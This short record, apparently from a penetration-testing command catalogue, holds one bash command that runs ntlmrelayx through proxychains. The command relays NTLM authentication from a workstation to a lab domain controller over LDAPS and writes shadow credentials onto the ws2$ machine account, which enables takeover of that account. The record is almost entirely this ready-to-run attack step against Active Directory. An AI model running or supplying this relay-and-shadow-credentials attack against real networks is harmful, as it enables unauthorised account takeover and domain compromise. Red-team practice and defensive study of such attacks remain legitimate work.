---
id: c61979c3-c8af-4817-a321-ba31b9dedaf2
name: Set up ntlmrelayx to relay authentication from target workstation to DC
type: command
executor: bash
data: proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials
  --shadow-target ws2\$ --http-port 81
output: null
created_at: '2023-04-06T03:56:06.310856+00:00'
updated_at: '2023-04-10T20:26:05.079234+00:00'
---

# Set up ntlmrelayx to relay authentication from target workstation to DC

```bash
proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
```
